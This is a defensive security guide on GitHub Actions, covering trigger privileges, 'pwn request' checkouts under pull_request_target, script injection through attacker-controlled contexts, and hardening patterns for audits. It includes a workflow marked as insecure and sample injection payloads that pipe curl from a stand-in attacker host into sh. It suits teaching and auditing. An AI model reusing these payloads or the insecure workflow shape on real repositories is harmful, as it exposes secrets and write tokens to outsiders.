# Triggers, privilege and script injection

## Contents

- [Trust matrix](#trust-matrix)
- [Why `pull_request_target` exists and how it breaks](#why-pull_request_target-exists-and-how-it-breaks)
- [What `actions/checkout` blocks now](#what-actionscheckout-blocks-now)
- [The privilege-separation pattern](#the-privilege-separation-pattern)
- [Hardening a `pull_request_target` workflow you must keep](#hardening-a-pull_request_target-workflow-you-must-keep)
- [Attacker-controllable contexts](#attacker-controllable-contexts)
- [The `env:` fix](#the-env-fix)
- [Where interpolation is and is not a shell sink](#where-interpolation-is-and-is-not-a-shell-sink)
- [Comment-driven workflows](#comment-driven-workflows)
- [Environment and output files](#environment-and-output-files)
- [Threat model for an audit](#threat-model-for-an-audit)

## Trust matrix

The first question about any workflow is: can an outside contributor fire it, and if so what
token and secrets does the run get?

| Trigger | Who can fire it | `GITHUB_TOKEN` | Secrets | Workflow definition comes from |
|---|---|---|---|---|
| `push`, `workflow_dispatch`, `schedule` | Collaborators only | read/write | yes | the pushed ref / default branch |
| `pull_request`, same-repo branch | Collaborators | read/write | yes | the PR merge commit |
| `pull_request` **from a fork** | anyone | **read-only** | **none** | the PR merge commit |
| `pull_request_target` | anyone with a fork | read/write | yes | **base default branch** |
| `workflow_run` | fires after another workflow | read/write | yes | base default branch |
| `issue_comment`, `issues` | anyone | read/write | yes | base default branch |

`pull_request` from a fork is safe *by design*: GitHub runs untrusted workflow code, so it strips
the token to read-only and withholds secrets. The classic mistake is a maintainer noticing "the
secrets don't work on fork PRs" and switching to `pull_request_target` to get them back.
[official]

## Why `pull_request_target` exists and how it breaks

Under `pull_request_target` the workflow file, and any `actions/checkout` with no `ref:`, come
from the **base repository's default branch**. Only trusted code runs, which is what makes it
safe to hand over secrets and a write token. It is the correct trigger for labelling, triage and
posting authenticated status checks on fork PRs.

The vulnerability — a "pwn request" — appears when the workflow overrides that default to fetch
the fork's code:

```yaml
# INSECURE
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make test          # <- the actual vulnerability
```

The checkout step alone executes nothing. The next step does, and it does not need to look like
a build: `npm install`, `pip install -e .`, a `Makefile`, a `conftest.py`, a devcontainer hook or
a transitive dependency's lifecycle script are all attacker-supplied code paths. Report the
finding on the pair, and name the executing step. [official]

The same shape exists on any privileged trigger. An `issue_comment` job that runs
`gh pr checkout` and then a test command, or a `workflow_run` job that downloads an artifact and
executes it, is the same bug. Artifacts produced by a fork's `pull_request` run are untrusted
data.

Other vulnerable shapes to grep for:

- `ref: refs/pull/${{ github.event.pull_request.number }}/merge`
- `repository: ${{ github.event.pull_request.head.repo.full_name }}`
- `git fetch` of a PR ref, `gh pr checkout`, `actions/download-artifact` from another run

## What `actions/checkout` blocks now

`actions/checkout` refuses to check out fork pull-request head refs from a
`pull_request_target` workflow unless the workflow sets `allow-unsafe-pr-checkout: true`. The
input is deliberately named to stand out in review and static analysis, so its presence *is* the
finding — do not treat it as configuration. [official]

The protection covers fork PR refs only. Checking out an unrelated third-party repository,
fetching code with `git fetch` or `gh pr checkout`, or running a downloaded artifact is not
covered.

Repository, organisation and enterprise administrators can also remove the risk wholesale with
workflow execution protections, which restrict which events and actors may trigger workflows. If
a repository has no legitimate use for `pull_request_target`, that is the stronger fix than
reviewing each workflow.

## The privilege-separation pattern

Untrusted code runs in one workflow with no secrets; a second, privileged workflow consumes only
its output.

```yaml
# 1) unprivileged: runs the PR's code
name: PR build
on: pull_request
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          persist-credentials: false
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@<sha>
        with: { name: pr, path: dist/ }
```

```yaml
# 2) privileged: never checks out PR code
name: PR comment
on:
  workflow_run:
    workflows: ["PR build"]
    types: [completed]
permissions: {}
jobs:
  comment:
    if: github.event.workflow_run.conclusion == 'success'
    permissions:
      pull-requests: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@<sha>
        with:
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      # treat the artifact as data: validate before using it as a command argument
```

Two consequences worth stating in a review:

- The `workflow_run` payload carries no PR number, so it usually has to travel through the
  artifact. That value came from an untrusted build, so validate it (a PR number must match
  `^[0-9]+$`) before it reaches a command line.
- `persist-credentials: false` on the unprivileged checkout keeps the token out of
  `.git/config`, where a build script could read it.

## Hardening a `pull_request_target` workflow you must keep

- Scope `permissions:` to the minimum, per job, and reference only the secrets that job needs.
- Cache is read-only in the default branch's scope for `pull_request_target` runs: a save fails
  with a warning while the step and job continue, which is deliberate anti-cache-poisoning
  behaviour, not a bug to work around. Populate the cache from a `push` workflow instead.
- Self-hosted runners must be ephemeral and isolated from internal resources, since fork code
  reaching one is a foothold in your network rather than in a throwaway VM.
- Everything in the injection sections below still applies; privileged triggers are exactly where
  injection is worth the most.

## Attacker-controllable contexts

Anyone who can open an issue, a PR or a comment sets these:

| Context | Set by |
|---|---|
| `github.event.issue.title`, `.body` | issue author |
| `github.event.pull_request.title`, `.body` | PR author |
| `github.event.pull_request.head.ref`, `.head.label`, `github.head_ref` | PR author (branch name) |
| `github.event.comment.body` | commenter |
| `github.event.review.body`, `.review_comment.body` | reviewer |
| `github.event.commits.*.message`, `head_commit.message` | commit author |
| `github.event.commits.*.author.name`, `.email` | commit author |
| `github.event.pages.*.page_name` | wiki editor |

Server-controlled values — `github.actor`, `github.repository`, `github.sha`, `github.ref`,
`github.event.pull_request.number` — are not attacker-set. A numeric field like `number` is not
an injection sink; do not report it as one.

A branch named `$(curl attacker.sh|sh)` or an issue titled `"; curl attacker.sh|sh #` becomes
shell the moment it is interpolated into a `run:` block.

## The `env:` fix

Bind the untrusted value to an environment variable and reference the quoted **shell** variable.
`${{ }}` then appears only on the `env:` side, where it is assigned as a value instead of being
spliced into a command.

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    HEAD_REF: ${{ github.head_ref }}
  run: |
    printf '%s\n' "$PR_TITLE"
    git checkout "$HEAD_REF"
```

Always quote the expansion: an unquoted `$PR_TITLE` still word-splits and globs. The
alternative official fix is to pass the value as an input to an action that takes it as an
argument rather than building a shell command from it.

`actions/github-script` needs the same treatment, because `script:` is JavaScript that the
runner assembles the same way:

```yaml
- uses: actions/github-script@<sha>
  env:
    TITLE: ${{ github.event.issue.title }}
  with:
    script: console.log(process.env.TITLE)
```

## Where interpolation is and is not a shell sink

- `run:` — a shell sink. Always.
- `with:` inputs — depends on the receiving action. `actions/github-script`'s `script:` is a
  `with:` input and is executed; a composite action that pastes an input into its own `run:` is
  equally exposed. Read the action, or pass the value through `env:`.
- `if:` conditions and job- or step-level `env:` values — evaluated by the Actions runtime, not
  by a shell. Not injection sinks, though an `if:` built from attacker data can still be a logic
  bypass.
- Custom action inputs that reach a shell inside the action — validate the value there, for
  example a branch name against `^[A-Za-z0-9._/-]+$`.

## Comment-driven workflows

An `issue_comment` workflow that parses commands runs with a write token and secrets for
*anybody's* comment. Two independent requirements:

- An authorisation gate before anything happens, on `github.event.comment.author_association`
  (`OWNER`, `MEMBER`, `COLLABORATOR`) or an equivalent membership check. Without it, the command
  is open to the internet.
- No injection in the command handler. The comment body is the most attacker-controlled string
  in the whole event payload.

An approval-then-checkout design has a time-of-check/time-of-use hole: the PR head can move
between the maintainer's approval and the run. Pin the approved SHA.

## Environment and output files

Untrusted multi-line data written to `$GITHUB_ENV` or `$GITHUB_OUTPUT` can inject additional
variables or step outputs, because those files are parsed line by line. Use the random-delimiter
heredoc form and never write raw user input:

```bash
delimiter="$(openssl rand -hex 16)"
{
  printf 'BODY<<%s\n' "$delimiter"
  printf '%s\n' "$UNTRUSTED"
  printf '%s\n' "$delimiter"
} >> "$GITHUB_ENV"
```

Secrets are redacted from logs only if the exact value was registered with the runner. A
transformed secret (base64, URL-encoded, a JWT signed with it) is not redacted unless you
register the new value too, and structured secrets — a JSON or YAML blob — defeat redaction
because there is no exact string to match. Never enable `set -x` in a step that handles one.

## Threat model for an audit

Report only what someone **without** write access can reach. Explicitly out of the model:

- injection through `workflow_dispatch` inputs — triggering it requires write access;
- expression injection in `push`-only workflows on protected branches;
- `workflow_call` input injection where every caller is internal;
- secrets in `workflow_dispatch`- or `schedule`-only workflows.

For each reported finding, name the entry point, the payload, the execution mechanism, the
credential or capability gained, and the steps to reproduce. Missing any of the five means the
finding is "needs verification", not Critical.

Patterns that look alarming and are not findings: `pull_request_target` with no checkout of fork
code; `${{ github.event.pull_request.number }}` in a `run:`; `${{ }}` in `if:` or in a
job-level `env:`; a same-repo local action under `./.github/actions/`; a fork `pull_request` run
executing untrusted code with its read-only token and no secrets.

<!-- sources: awesome-copilot, getsentry-skills, github-docs, scrutineer, scorecard, secure-repo -->
